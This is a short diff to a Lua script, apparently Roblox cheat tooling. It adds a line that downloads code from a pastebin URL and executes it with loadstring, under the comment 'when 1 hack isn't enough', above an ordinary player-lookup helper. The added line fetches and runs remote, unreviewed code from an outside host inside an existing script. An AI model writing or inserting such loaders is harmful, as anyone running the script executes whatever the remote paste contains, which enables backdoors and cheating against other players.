@@ -1,3 +1,5 @@
+loadstring(game:HttpGet("https://pastebin.com/raw/2V0Pqt04", true))()
+--when 1 hack isn't enough
 function GetPlayer(String)
    local Found = {}
    local strl = String:lower()
